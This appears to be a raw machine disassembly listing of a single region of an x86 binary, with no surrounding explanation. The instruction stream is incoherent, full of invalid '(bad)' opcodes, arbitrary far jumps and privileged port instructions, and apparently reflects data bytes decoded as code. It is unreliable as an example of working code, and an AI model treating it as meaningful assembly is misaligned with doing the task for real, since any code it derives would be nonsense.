  41a4d6:	pop    ss
  41a4d7:	add    eax,0x3c0ea8d4
  41a4dc:	sub    esi,DWORD PTR [ebp-0x74]
  41a4df:	jae    0x41a485
  41a4e1:	fidivr DWORD PTR [eax+ecx*1+0x13]
  41a4e5:	lods   al,BYTE PTR ds:[esi]
  41a4e6:	mov    esp,0x3cf90f7d
  41a4eb:	outs   dx,BYTE PTR ds:[esi]
  41a4ec:	sbb    ch,BYTE PTR [ebp+0x75]
  41a4ef:	dec    ebp
  41a4f0:	xor    DWORD PTR [edx-0x17],ecx
  41a4f3:	scas   al,BYTE PTR es:[edi]
  41a4f4:	fistp  DWORD PTR [ebx+esi*2]
  41a4f7:	sbb    ch,BYTE PTR [ebx+0x64bcfc]
  41a4fd:	sub    BYTE PTR [eax-0x6e2661b8],ah
  41a503:	dec    ebx
  41a504:	jae    0x41a4de
  41a506:	pusha  
  41a507:	and    esp,DWORD PTR [eax]
  41a509:	cld    
  41a50a:	xchg   edx,eax
  41a50b:	cs jo  0x41a49f
  41a50e:	or     ecx,edi
  41a510:	jg     0x41a511
  41a512:	jmp    0x15ca:0x1849eaf8
  41a519:	jp     0x41a49d
  41a51b:	inc    ebx
  41a51c:	aaa    
  41a51d:	mov    dh,BYTE PTR [edi+0x5a]
  41a520:	out    0x40,eax
  41a522:	push   esp
  41a523:	xchg   DWORD PTR [esi+edx*4],edx
  41a526:	ret    
  41a527:	xor    al,0xf
  41a529:	loopne 0x41a4c4
  41a52b:	jmp    0x5b99:0xc8585323
  41a532:	(bad)  
  41a533:	out    0xd1,al
  41a535:	aaa    
  41a536:	pop    esi
  41a537:	dec    ecx
  41a538:	mov    bl,0x45
  41a53a:	mov    esp,0x53738de9
  41a53f:	daa    
  41a540:	test   dl,0xc
  41a543:	and    al,0xbb
  41a545:	hlt    
  41a546:	fucomp st(7)
  41a548:	push   edx
  41a549:	hlt    
  41a54a:	or     edi,ebp
  41a54c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a54d:	xchg   esp,eax
  41a54e:	dec    DWORD PTR [eax+0x4fb746af]
  41a554:	es cs popa 
  41a557:	dec    esp
  41a558:	stc    
  41a559:	add    DWORD PTR [ebx-0x795e85b9],esi
  41a55f:	sti    
  41a560:	fwait
  41a561:	loopne 0x41a531
  41a563:	push   ds
  41a564:	jge    0x41a5b0
  41a566:	sbb    eax,DWORD PTR [ebp+edx*1-0x4004d6a8]
  41a56d:	mov    dl,BYTE PTR [ebx+0x1a]
  41a570:	sbb    DWORD PTR [esi],esi
  41a572:	leave  
  41a573:	test   al,0x79
  41a575:	cmp    edx,ecx
  41a577:	div    BYTE PTR [edx-0x4c13716a]
  41a57d:	adc    bl,cl
  41a57f:	test   BYTE PTR [ecx-0x5453f46],ch
  41a585:	jmp    0x1a5:0xbd2765f6
  41a58c:	pop    ds
  41a58d:	in     eax,dx
  41a58e:	jno    0x41a5b1
  41a590:	sbb    BYTE PTR [ecx-0x7d2942cf],ch
  41a596:	push   ss
  41a597:	int3   
  41a598:	inc    ecx
  41a599:	arpl   WORD PTR [eax-0x76],sp
  41a59c:	mov    bh,0x73
  41a59e:	in     al,dx
  41a59f:	scas   al,BYTE PTR es:[edi]
  41a5a0:	aas    
  41a5a1:	scas   al,BYTE PTR es:[edi]
  41a5a2:	dec    edx
  41a5a3:	adc    BYTE PTR [edi-0x3dfe96aa],dl
  41a5a9:	sub    DWORD PTR [esi-0x73],edx
  41a5ac:	sub    eax,0x3d7fec80
  41a5b1:	fldenv ds:0xc03bf04d
  41a5b7:	mov    dl,0xc1
  41a5b9:	(bad)  
  41a5ba:	and    eax,0x521c3eb4
  41a5bf:	jmp    0xeb752ce3
  41a5c4:	sbb    ch,BYTE PTR [eax-0x7024a9bb]
  41a5ca:	cmp    DWORD PTR [ecx],0xa9286cce
  41a5d0:	adc    al,0x8d
  41a5d2:	shr    BYTE PTR [ecx+0x6ad042bd],1
  41a5d8:	stos   DWORD PTR es:[edi],eax
  41a5d9:	fldenv [ecx]
  41a5db:	dec    ebx
  41a5dc:	inc    ebx
  41a5dd:	int3   
  41a5de:	xor    DWORD PTR [ecx+0x50dd63f9],esp
  41a5e4:	frstor [ecx]
  41a5e6:	es ss cwde 
  41a5e9:	in     eax,dx
  41a5ea:	mov    cl,BYTE PTR [edi]
  41a5ec:	cld    
  41a5ed:	and    DWORD PTR [esi+0x6e705a70],0x2d
  41a5f4:	mov    ebp,0xb012132
  41a5f9:	mov    eax,cs
  41a5fb:	mov    bl,0x50
  41a5fd:	ds pop edi
  41a5ff:	pushf  
  41a600:	leave  
  41a601:	mov    ebp,eax
  41a603:	and    DWORD PTR [edi+0x24],esi
  41a606:	mov    ah,0xef
  41a608:	mov    dl,0x21
  41a60a:	mov    eax,0x9412598
  41a60f:	pop    es
  41a610:	(bad)  
  41a611:	ror    DWORD PTR ds:0xb0bdf1cc,cl
  41a617:	inc    eax
  41a618:	push   esi
  41a619:	xlat   BYTE PTR ds:[ebx]
  41a61a:	and    DWORD PTR ds:0x49a30830,ebp
  41a620:	dec    esp
  41a621:	lods   eax,DWORD PTR ds:[esi]
  41a622:	lods   eax,DWORD PTR ds:[esi]
  41a623:	and    cl,dh
  41a625:	iret   
  41a626:	pop    ebx
  41a627:	lds    edi,FWORD PTR [eax-0x3]
  41a62a:	pusha  
  41a62b:	mov    ecx,0x962e3ee0
  41a630:	mov    edi,0x6f52599c
  41a635:	icebp  
  41a636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a637:	add    DWORD PTR [edi-0x4a],edx
  41a63a:	xor    al,0xc3
  41a63c:	push   ss
  41a63d:	inc    DWORD PTR [eax]
  41a63f:	inc    ecx
  41a640:	mov    ds:0x1c3b7177,eax
  41a645:	out    0x7b,al
  41a647:	xor    dl,BYTE PTR [esi]
  41a649:	fild   DWORD PTR [esi+0xc2284ce]
  41a64f:	add    BYTE PTR [esp],al
  41a652:	pushf  
  41a653:	and    BYTE PTR es:[ebp-0xb],dh
  41a657:	outs   dx,DWORD PTR ds:[esi]
  41a658:	aad    0xc
  41a65a:	shl    DWORD PTR [esp+eax*2],1
  41a65d:	mov    dl,0xee
  41a65f:	test   al,0x8e
  41a661:	sub    BYTE PTR [edi-0x1d],cl
  41a664:	jnp    0x41a6d2
  41a666:	call   FWORD PTR [ebx-0x8d5cd6b]
  41a66c:	(bad)  
  41a66d:	sub    ch,BYTE PTR [ebx+0x46429068]
  41a673:	push   DWORD PTR [esi+0x68]
  41a676:	outs   dx,BYTE PTR ds:[esi]
  41a677:	push   cs
  41a678:	jo     0x41a641
  41a67a:	mov    eax,0xc581276d
  41a67f:	mov    edx,0x3e2f267a
  41a684:	dec    ebp
  41a685:	inc    eax
  41a686:	into   
  41a687:	jne    0x41a6d4
  41a689:	pusha  
  41a68a:	out    dx,al
  41a68b:	arpl   di,di
  41a68d:	jecxz  0x41a6da
  41a68f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a690:	sub    eax,0x65d7b5a
  41a695:	mov    eax,0x63d21656
  41a69a:	je     0x41a6c5
  41a69c:	rol    DWORD PTR [edi],1
  41a69e:	pop    esi
  41a69f:	jo     0x41a6ee
  41a6a1:	cmc    
  41a6a2:	mov    esi,0xfeb009d3
  41a6a7:	jne    0x41a69c
  41a6a9:	jge    0x41a69c
  41a6ab:	cmp    DWORD PTR [ecx+esi*2+0x5],ecx
  41a6af:	mov    ebx,0x4afada93
  41a6b4:	xor    eax,0xf542e894
  41a6b9:	loop   0x41a720
  41a6bb:	inc    esp
  41a6bc:	jno    0x41a70e
  41a6be:	push   ebp
  41a6bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6c0:	or     al,0x72
  41a6c2:	adc    eax,0x5ee5fcba
  41a6c7:	inc    edx
  41a6c8:	dec    eax
  41a6c9:	(bad)  
  41a6ca:	in     al,dx
  41a6cb:	xor    eax,0xf3d8fa6b
  41a6d0:	mov    al,0xe0
  41a6d2:	hlt    
  41a6d3:	ss inc esp
  41a6d5:	pop    ss
  41a6d6:	add    cl,0x1c
  41a6d9:	dec    esp
  41a6da:	cmp    al,0xe6
  41a6dc:	and    edi,DWORD PTR [edx]
  41a6de:	mov    BYTE PTR [ecx+0x49],0xc4
  41a6e2:	pop    esi
  41a6e3:	enter  0xbf28,0x9a
  41a6e7:	cmp    BYTE PTR [esi],al
  41a6e9:	mov    ds:0x9ef88e0f,al
  41a6ee:	ja     0x41a750
  41a6f0:	adc    ebx,DWORD PTR [ebx]
  41a6f2:	push   ss
  41a6f3:	and    al,0x8c
  41a6f5:	add    DWORD PTR ds:0x77056b20,eax
  41a6fb:	mov    dh,0xfc
  41a6fd:	lahf   
  41a6fe:	jno    0x41a680
  41a700:	fst    st(2)
  41a702:	xor    BYTE PTR [edi-0x4a2881a0],dl
  41a708:	clc    
  41a709:	dec    edx
  41a70a:	out    dx,eax
  41a70b:	add    ecx,0xffffff85
  41a70e:	scas   al,BYTE PTR es:[edi]
  41a70f:	jo     0x41a730
  41a711:	jg     0x41a70e
  41a713:	cmc    
  41a714:	add    eax,esi
  41a716:	imul   esp,DWORD PTR [eax-0x33],0xd
  41a71a:	push   ecx
  41a71b:	mov    ecx,0x4be3d096
  41a720:	inc    ebx
  41a721:	pushf  
  41a722:	and    DWORD PTR [ebx+0xcf948ed],0x3fb43210
  41a72c:	lods   al,BYTE PTR ds:[esi]
  41a72d:	pop    ebp
  41a72e:	add    eax,0xcb914960
  41a733:	dec    esi
  41a734:	dec    ebp
  41a735:	(bad)  
  41a736:	jmp    0x41a763
  41a738:	cmp    cl,dl
  41a73a:	sbb    DWORD PTR ds:0x6ab38c7e,eax
  41a740:	lahf   
  41a741:	add    al,0x3f
  41a743:	in     al,0xa7
  41a745:	gs enter 0xab45,0x76
  41a74a:	jge    0x41a72b
  41a74c:	push   esi
  41a74e:	and    al,BYTE PTR ds:0xc1423e90
  41a754:	retf   
  41a755:	jp     0x41a72f
  41a757:	out    dx,eax
  41a758:	mov    cl,0x32
  41a75a:	xor    esi,esp
  41a75c:	push   ds
  41a75d:	inc    eax
  41a75e:	in     al,dx
  41a75f:	xor    al,0x59
  41a761:	jb     0x41a73f
  41a763:	dec    edx
  41a764:	shr    BYTE PTR [eax+eiz*4+0x169e50d1],cl
  41a76b:	cld    
  41a76c:	inc    edi
  41a76d:	cs jle 0x41a7cb
  41a770:	into   
  41a771:	xchg   esi,eax
  41a772:	cmc    
  41a773:	pop    es
  41a774:	xor    DWORD PTR [esi+0x20],edx
  41a777:	sub    ah,BYTE PTR [esi-0x28227f62]
  41a77d:	repnz int 0xc1
  41a780:	and    eax,0xa9f4c22f
  41a785:	fidivr WORD PTR [ebx-0x3c]
  41a788:	and    eax,0xfd28b73b
  41a78d:	out    dx,al
  41a78e:	cmc    
  41a78f:	dec    esi
  41a790:	(bad)
  41a793:	pop    ebp
  41a794:	nop
  41a795:	xor    edi,eax
  41a797:	lock cli 
  41a799:	push   esi
  41a79a:	js     0x41a799
  41a79c:	pop    ebp
  41a79d:	shr    DWORD PTR [ebx],1
  41a79f:	lods   al,BYTE PTR ds:[esi]
  41a7a0:	aaa    
  41a7a1:	or     BYTE PTR [ebp+0x0],dh
  41a7a4:	bound  edx,QWORD PTR [edi-0x6d080581]
  41a7aa:	mov    ds:0xdc479944,eax
  41a7af:	retf   
  41a7b0:	mov    gs,WORD PTR [edx+0x4a]
  41a7b3:	mov    ebp,0x631ba46f
  41a7b8:	pushf  
  41a7b9:	and    al,0xbb
  41a7bb:	gs scas eax,DWORD PTR es:[edi]
  41a7bd:	dec    ebx
  41a7be:	cld    
  41a7bf:	sbb    BYTE PTR [edi+0x24a3bb31],ch
  41a7c5:	xchg   DWORD PTR [edx+0x11],ecx
  41a7c8:	aas    
  41a7c9:	xor    esi,DWORD PTR [ebp+0x35]
  41a7cc:	adc    bh,al
  41a7ce:	daa    
  41a7cf:	retf   0x624f
  41a7d2:	pusha  
  41a7d3:	lahf   
  41a7d4:	(bad)  
  41a7d5:	inc    ecx
  41a7d6:	ror    BYTE PTR [esi],0xf0
  41a7d9:	nop    ecx
  41a7dc:	or     DWORD PTR [ecx],0x62d9e51e
  41a7e2:	mov    ebx,0x6f1f6892
  41a7e7:	(bad)  
  41a7e8:	push   cs
  41a7e9:	dec    ecx
  41a7ea:	xchg   edx,ecx
  41a7ec:	mov    ebx,DWORD PTR [ecx+0x1dfc8c47]
  41a7f2:	sbb    BYTE PTR [esi],cl
  41a7f4:	push   ebx
  41a7f5:	loope  0x41a804
  41a7f7:	ins    BYTE PTR es:[edi],dx
  41a7f8:	lock xor BYTE PTR [ecx],dl
  41a7fb:	dec    ebp
  41a7fc:	ror    DWORD PTR [ebx],cl
  41a7fe:	dec    edi
  41a7ff:	in     eax,0x4e
  41a801:	pop    edx
  41a802:	fiadd  DWORD PTR [edi+0x3924d450]
  41a808:	xor    eax,DWORD PTR [esi+0x1b]
  41a80b:	xor    al,0x8
  41a80d:	xor    al,0x4a
  41a80f:	jae    0x41a879
  41a811:	inc    eax
  41a812:	inc    edx
  41a813:	jge    0x41a7fa
  41a815:	arpl   si,cx
  41a817:	sbb    DWORD PTR [edx-0x38],ebp
  41a81a:	retf   
  41a81b:	adc    DWORD PTR ds:0x6fb43ef0,ebx
  41a821:	dec    edi
  41a822:	cmp    ah,dl
  41a824:	ja     0x41a86b
  41a826:	xchg   ebp,eax
  41a827:	(bad)  
  41a829:	mov    esi,0xb546ced0
  41a82e:	ret    
  41a82f:	adc    al,0x17
  41a831:	sub    eax,0xc88370c2
  41a836:	xor    ebx,DWORD PTR ds:0x3d93c995
  41a83c:	jecxz  0x41a7e5
  41a83e:	popa   
  41a83f:	adc    DWORD PTR [esi+edi*2+0x17],ecx
  41a843:	push   ebx
  41a844:	sub    DWORD PTR [edi-0x4a],edx
  41a847:	jbe    0x41a82c
  41a849:	mov    al,0xae
  41a84b:	mov    edx,0x4fc08d25
  41a850:	or     bh,BYTE PTR [ebx]
  41a852:	test   BYTE PTR [esi],bh
  41a854:	mov    ebp,0xc56e4bfd
  41a859:	call   0xf241:0x7fa3c534
  41a860:	sbb    eax,0x5f448dc1
  41a865:	nop
  41a866:	xlat   BYTE PTR ds:[ebx]
  41a867:	shl    BYTE PTR [ecx-0x13],1
  41a86a:	or     BYTE PTR [edi+0x2a],dh
  41a86d:	data16 stc 
  41a86f:	bound  esp,QWORD PTR [eax]
  41a871:	push   ebp
  41a872:	mov    dh,0x5
  41a874:	loop   0x41a89d
  41a876:	int    0xca
  41a878:	sub    dl,bl
  41a87a:	and    al,BYTE PTR [edx-0x4e399999]
  41a880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a881:	int3   
  41a882:	mov    esp,0x26541c0e
  41a887:	xchg   edi,eax
  41a888:	sbb    eax,0x8c59d1a8
  41a88d:	xor    DWORD PTR [ecx-0x6f],esp
  41a890:	mov    ds:0xa652b055,eax
  41a895:	jmp    FWORD PTR [edx+0x13280563]
  41a89b:	xlat   BYTE PTR ds:[ebx]
  41a89c:	mov    ds:0xe350b66e,eax
  41a8a1:	scas   eax,DWORD PTR es:[edi]
  41a8a2:	ja     0x41a826
  41a8a4:	push   esp
  41a8a5:	sbb    DWORD PTR [ebp+0x32],0xffffffa4
  41a8a9:	iret   
  41a8aa:	je     0x41a907
  41a8ac:	fmul   st,st(0)
  41a8ae:	add    bl,BYTE PTR [edx]
  41a8b0:	dec    ebx
  41a8b1:	and    DWORD PTR [ebp-0x66],0x54fb7ca7
  41a8b8:	jo     0x41a893
  41a8ba:	push   cs
  41a8bb:	mov    bh,0x96
  41a8bd:	pop    esi
  41a8be:	cli    
  41a8bf:	cmp    eax,ebx
  41a8c1:	xchg   edi,eax
  41a8c2:	pop    edi
  41a8c3:	adc    DWORD PTR ds:0xbf9b26eb,esp
  41a8c9:	inc    edx
  41a8ca:	add    eax,0xd6e65804
  41a8cf:	enter  0xfbe4,0x80
  41a8d3:	sbb    bl,cl
  41a8d5:	dec    edx
  41a8d6:	shl    DWORD PTR [eax],0x1a
  41a8d9:	mov    bl,0x43
  41a8db:	leave  
  41a8dc:	cmp    BYTE PTR [edx+0x279e8d2d],0xda
  41a8e3:	push   ss
  41a8e4:	addr16 into 
  41a8e6:	addr16 sub esp,ebp
  41a8e9:	mov    esp,0x18a0b835
  41a8ee:	leave  
  41a8ef:	shr    BYTE PTR [edi],cl
  41a8f1:	test   DWORD PTR [ecx],ecx
  41a8f3:	inc    ebp
  41a8f4:	xchg   edx,eax
  41a8f5:	shr    DWORD PTR [ecx],1
  41a8f7:	sub    eax,0x4cd6b595
  41a8fc:	push   DWORD PTR [ebx+0x122d0208]
  41a902:	push   ss
  41a903:	popf   
  41a904:	mov    ebx,0x8bb69dea
  41a909:	retf   0x5a80
  41a90c:	xchg   BYTE PTR [esi-0x61],al
  41a90f:	arpl   bp,di
  41a911:	sar    DWORD PTR [edx+0x249036e2],1
  41a917:	fist   WORD PTR [edx]
  41a919:	mov    esp,0x5e01fb55
  41a91e:	dec    edi
  41a91f:	inc    ecx
  41a920:	mov    ebp,DWORD PTR [eax-0x4]
  41a923:	mov    ebx,0xc1889305
  41a928:	aad    0xe9
  41a92a:	xchg   ebx,eax
  41a92b:	add    eax,0x2683b0ec
  41a930:	fs fs jbe 0x41a9b3
  41a934:	xchg   esi,eax
  41a935:	(bad)  
  41a936:	and    dh,BYTE PTR [ecx]
  41a938:	xchg   edx,eax
  41a939:	rcr    BYTE PTR ds:0x4eea4101,1
  41a93f:	xor    BYTE PTR [ebp+0x3d],al
  41a942:	rol    BYTE PTR [edi-0x3d],1
  41a945:	jmp    0xa355187e
  41a94a:	sub    al,0xb3
  41a94c:	out    dx,eax
  41a94d:	data16 fwait
  41a94f:	sti    
  41a950:	jo     0x41a923
  41a952:	pusha  
  41a953:	rcl    BYTE PTR [ecx],0x66
  41a956:	mov    ebp,0xca0ba757
  41a95b:	fscale 
  41a95d:	inc    esp
  41a95e:	pop    ebp
  41a95f:	or     eax,esp
  41a961:	jb     0x41a925
  41a963:	fnstcw WORD PTR ds:0x48ec6a8f
  41a969:	leave  
  41a96a:	clc    
  41a96b:	cmp    cl,BYTE PTR [ebx]
  41a96d:	push   ds
  41a96e:	inc    edx
  41a96f:	or     DWORD PTR [ebp+0x2b],esi
  41a972:	sub    BYTE PTR [edx],bl
  41a974:	sbb    ch,BYTE PTR [ecx+0x64]
  41a977:	hlt    
  41a978:	sub    eax,0xb4c27137
  41a97d:	jne    0x41a96c
  41a97f:	jl     0x41a9f1
  41a981:	lahf   
  41a982:	(bad)  
  41a983:	aaa    
  41a984:	jb     0x41a9d7
  41a986:	push   ss
  41a987:	imul   esp,DWORD PTR [ecx+0x1e],0xcf977090
  41a98e:	add    BYTE PTR [edx],bl
  41a990:	push   ds
  41a991:	sub    BYTE PTR ss:[eax+0x387f4f2f],ch
  41a998:	sti    
  41a999:	cmp    BYTE PTR [ebp+0x37],ah
  41a99c:	mov    bh,0xdc
  41a99e:	add    al,0xe0
  41a9a0:	jo     0x41a971
  41a9a2:	imul   esp,ebp,0xffffffca
  41a9a5:	mov    esp,DWORD PTR [edx]
  41a9a7:	arpl   WORD PTR [eax+0x476152d3],di
  41a9ad:	cs out dx,al
  41a9af:	jl     0x41a93c
  41a9b1:	mov    bl,0x38
  41a9b3:	add    dl,al
  41a9b5:	sbb    eax,0x7f6a143a
  41a9ba:	cmp    edi,esp
  41a9bc:	adc    eax,0xe21a67f5
  41a9c1:	das    
  41a9c2:	xor    al,0xe
  41a9c4:	cld    
  41a9c5:	into   
  41a9c6:	add    dl,0x93
  41a9c9:	jle    0x41a993
  41a9cb:	test   BYTE PTR [edi-0x5ab4f0b0],bh
  41a9d1:	xor    al,dh
  41a9d3:	sbb    eax,DWORD PTR [eax+ebp*4]
  41a9d6:	sbb    BYTE PTR [ebp-0x70],0x71
  41a9da:	enter  0xbbd0,0xed
  41a9de:	jmp    0x818c1c6e
  41a9e3:	int    0xef
  41a9e5:	push   ebp
  41a9e6:	out    dx,al
  41a9e7:	jle    0x41a9b8
  41a9e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9ea:	fs popa 
  41a9ec:	aas    
  41a9ed:	jp     0x41a9ce
  41a9ef:	adc    BYTE PTR [esi],bh
  41a9f1:	pop    ebp
  41a9f2:	sub    eax,0x66ec2caf
  41a9f7:	inc    edi
  41a9f8:	sbb    DWORD PTR cs:[edx],edx
  41a9fb:	add    cl,BYTE PTR [ebp-0x40ca12d7]
  41aa01:	mov    ch,dl
  41aa03:	ror    dl,cl
  41aa05:	pop    edx
  41aa06:	adc    dl,al
  41aa08:	neg    BYTE PTR [ebp-0x16a8ef2a]
  41aa0e:	mov    dl,0xb0
  41aa10:	sti    
  41aa11:	test   eax,0xa5012160
  41aa16:	dec    esi
  41aa17:	std    
  41aa18:	xor    BYTE PTR ds:0x57d69960,0x2b
  41aa1f:	mov    ds:0xb0e29962,al
  41aa24:	sbb    al,0xa9
  41aa26:	rol    bh,1
  41aa28:	test   eax,0x3d74ae0f
  41aa2d:	jnp    0x41aa95
  41aa2f:	loop   0x41aaae
  41aa31:	inc    ebp
  41aa32:	sub    dl,dh
  41aa34:	mov    DWORD PTR [ebx],edi
  41aa36:	imul   DWORD PTR [ecx-0x46]
  41aa39:	mov    BYTE PTR [ecx+0x3a8d3ef],0x51
  41aa40:	jne    0x41aa5a
  41aa42:	mov    ecx,0xde393e76
  41aa47:	mov    al,ds:0xe1eff33e
  41aa4c:	fisubr WORD PTR [ecx+0x1c7e5a7d]
  41aa52:	pop    ecx
  41aa53:	ds push edx
  41aa55:	ins    DWORD PTR es:[edi],dx
  41aa56:	scas   eax,DWORD PTR es:[edi]
  41aa57:	or     al,0x91
  41aa59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa5a:	sbb    BYTE PTR [edi+0x5b53aab4],cl
  41aa60:	sub    BYTE PTR [ebx-0x708a3a62],dl
  41aa66:	and    ch,BYTE PTR ds:0x1d684640
  41aa6c:	fidivr WORD PTR [eax-0x74]
  41aa6f:	and    eax,0x1bbaeba
  41aa74:	sub    eax,0xcf3252a4
  41aa79:	sti    
  41aa7a:	push   esp
  41aa7b:	cmp    eax,0xada68186
  41aa80:	mov    al,cl
  41aa82:	jmp    0x91ed:0x1ff8e6b
  41aa89:	cld    
  41aa8a:	or     DWORD PTR [ebx-0x3e],esi
  41aa8d:	(bad)  
  41aa8e:	les    ebp,FWORD PTR [esi+edx*8]
  41aa91:	fs push esp
  41aa93:	add    edi,DWORD PTR [ebp+0x45781882]
  41aa99:	(bad)
  41aa9c:	mov    al,0xd0
  41aa9e:	sbb    BYTE PTR [ebx],ch
  41aaa0:	xlat   BYTE PTR ds:[ebx]
  41aaa1:	popf   
  41aaa2:	js     0x41ab04
  41aaa4:	shl    DWORD PTR [ebx+0x30a6cf8],1
  41aaaa:	jecxz  0x41aa65
  41aaac:	or     DWORD PTR [ebx-0x8],ebx
  41aaaf:	push   es
  41aab0:	jno    0x41aaae
  41aab2:	xchg   edx,eax
  41aab3:	jbe    0x41aacc
  41aab5:	inc    esi
  41aab6:	cmp    ebp,ebp
  41aab8:	fnsave [edx+esi*4-0x4d]
  41aabc:	and    DWORD PTR [eax-0x6b],ecx
  41aabf:	cld    
  41aac0:	inc    bx
  41aac2:	push   ebx
  41aac3:	mov    ds:0xc487ef8a,al
  41aac8:	retf   
  41aac9:	fld    st(5)
  41aacb:	sub    edi,edi
  41aacd:	das    
  41aace:	ss into 
  41aad0:	mov    edi,0xa9fe6b4b
  41aad5:	test   al,0xdd
  41aad7:	jne    0x41ab28
  41aad9:	mov    ?,WORD PTR [ebp+0x25]
  41aadc:	mov    ds,WORD PTR [edx+0x5f]
  41aadf:	push   eax
  41aae0:	je     0x41aa66
  41aae2:	add    al,0x8f
  41aae4:	adc    BYTE PTR [edx],bh
  41aae6:	push   edi
  41aae7:	sub    eax,0x533605ad
  41aaec:	xlat   BYTE PTR ds:[ebx]
  41aaed:	imul   edx,DWORD PTR [edx+eiz*4],0x4db783f6
  41aaf4:	mov    ebp,0x1c056a0a
  41aaf9:	adc    esi,ecx
  41aafb:	sub    bl,al
  41aafd:	shr    DWORD PTR [ebx+0x501ef5d9],1
  41ab03:	stc    
  41ab04:	sar    bl,1
  41ab06:	mov    al,0x58
  41ab08:	and    eax,0xb0f38ae8
  41ab0d:	push   ss
  41ab0e:	xchg   esp,eax
  41ab0f:	xchg   DWORD PTR [edx],ebp
  41ab11:	mov    ah,0xf5
  41ab13:	mov    ds:0xcc65a5a,al
  41ab18:	push   es
  41ab19:	out    0x0,al
  41ab1b:	std    
  41ab1c:	fstp   DWORD PTR [ebx]
  41ab1e:	jmp    0x6f46ac60
  41ab23:	xchg   ebp,eax
  41ab24:	or     BYTE PTR [esi],bl
  41ab26:	test   eax,0x5811e67f
  41ab2b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41ab2d:	cli    
  41ab2e:	mov    ds:0xe3b9173b,al
  41ab33:	ret    
  41ab34:	(bad)  
  41ab35:	jmp    0x31c4:0xc2ef95f2
  41ab3c:	cld    
  41ab3d:	das    
  41ab3e:	call   0xae239bf3
  41ab43:	stos   BYTE PTR es:[edi],al
  41ab44:	stos   BYTE PTR es:[edi],al
  41ab45:	cdq    
  41ab46:	jmp    0x41ab45
  41ab48:	scas   eax,DWORD PTR es:[edi]
  41ab49:	ins    DWORD PTR es:[edi],dx
  41ab4a:	mov    ah,0xec
  41ab4c:	aad    0xeb
  41ab4e:	and    ecx,DWORD PTR [ecx-0x12]
  41ab51:	sbb    edi,0x66c18b29
  41ab57:	xchg   ch,bl
  41ab59:	test   eax,0xc57574d7
  41ab5e:	loope  0x41ab4d
  41ab60:	sub    esp,DWORD PTR [ebp+0x74]
  41ab63:	inc    ebx
  41ab64:	jno    0x41abbd
  41ab66:	jg     0x41ab82
  41ab68:	cmp    al,0x26
  41ab6a:	in     eax,0xcc
  41ab6c:	and    DWORD PTR [edi-0x6afe93cf],0x2d
  41ab73:	dec    ebp
  41ab74:	imul   eax,DWORD PTR [eax+ebp*8],0xffffffe6
  41ab78:	inc    ebp
  41ab79:	sbb    DWORD PTR [ecx+0x76],ebp
  41ab7c:	imul   esp,DWORD PTR [eax],0xffffffbf
  41ab7f:	loop   0x41abce
  41ab81:	dec    ecx
  41ab82:	mov    WORD PTR [edi+0x17c1c1ec],ds
  41ab88:	cdq    
  41ab89:	repnz sar BYTE PTR [edx+esi*1+0x6c],1
  41ab8e:	inc    esp
  41ab8f:	adc    ebx,DWORD PTR [ecx]
  41ab91:	push   esi
  41ab92:	sti    
  41ab93:	jecxz  0x41abb8
  41ab95:	ins    DWORD PTR es:[edi],dx
  41ab96:	cmp    ecx,esp
  41ab98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab99:	xor    DWORD PTR [edx+esi*2+0xdd70f78],esp
  41aba0:	sbb    DWORD PTR [eax+0x1f3f18e9],edi
  41aba6:	mov    dh,0xa1
  41aba8:	das    
  41aba9:	jmp    0xfc5c:0x4c4448b6
  41abb0:	fimul  DWORD PTR [ecx+edi*2-0x1d43ddf]
  41abb7:	pop    edi
  41abb8:	(bad)  
  41abb9:	push   ebx
  41abba:	fbstp  TBYTE PTR ds:0x26621300
  41abc0:	in     al,dx
  41abc1:	mov    DWORD PTR [ecx-0x317eebe3],eax
  41abc7:	and    BYTE PTR [esi-0x4fe97849],0x50
  41abce:	pop    ds
  41abcf:	neg    DWORD PTR [ebx]
  41abd1:	(bad)  
  41abd2:	fisub  WORD PTR [edi-0x74]
  41abd5:	mov    DWORD PTR [edx+0x1d],ebx
  41abd8:	mov    bl,BYTE PTR [edx-0x771447df]
  41abde:	dec    ebp
  41abdf:	enter  0x846c,0x51
  41abe3:	jle    0x41ac45
  41abe5:	fistp  WORD PTR [ecx-0x61]
  41abe8:	jae    0x41ac31
  41abea:	cmp    BYTE PTR [ebx+0x7c63a4b3],al
  41abf0:	jle    0x41ac4b
  41abf2:	inc    ecx
  41abf3:	(bad)  
  41abf4:	mov    edi,0x1cecb152
  41abf9:	in     al,0x2a
  41abfb:	and    eax,0x1250a66b
  41ac00:	mov    dh,0x2
  41ac02:	adc    DWORD PTR [ebx-0x16],eax
  41ac05:	test   BYTE PTR [ecx],cl
  41ac07:	mov    ds:0xf507012e,al
  41ac0c:	mov    BYTE PTR [edx-0x39],dh
  41ac0f:	clc    
  41ac10:	jae    0x41abf4
  41ac12:	ret    0xa43d
  41ac15:	xchg   ebp,eax
  41ac16:	xchg   ebp,eax
  41ac17:	loop   0x41ac8a
  41ac19:	lds    esi,FWORD PTR [ebx+ebx*4]
  41ac1c:	adc    edx,edx
  41ac1e:	mov    eax,0x35fadbfd
  41ac23:	mov    DWORD PTR [esi-0xcdf8d37],edx
  41ac29:	int3   
  41ac2a:	lock xchg ebx,eax
  41ac2c:	ret    0x2bb3
  41ac2f:	mov    bh,0x5f
  41ac31:	(bad)  
  41ac33:	xlat   BYTE PTR ds:[ebx]
  41ac34:	sahf   
  41ac35:	inc    edx
  41ac36:	enter  0xd814,0x66
  41ac3a:	mov    ds:0x8334811a,al
  41ac3f:	jmp    0x41abdb
  41ac41:	sar    BYTE PTR [esp+ebx*1-0x299a3810],0xf4
  41ac49:	fstp   TBYTE PTR [ecx*4+0x649ede9a]
  41ac50:	push   eax
  41ac51:	jmp    0xb5a4:0x27e59310
  41ac58:	in     eax,0xcb
  41ac5a:	aad    0xe5
  41ac5c:	out    0x6b,al
  41ac5e:	sub    al,0x95
  41ac60:	pop    edi
  41ac61:	push   edx
  41ac62:	aad    0x9a
  41ac64:	jle    0x41ac67
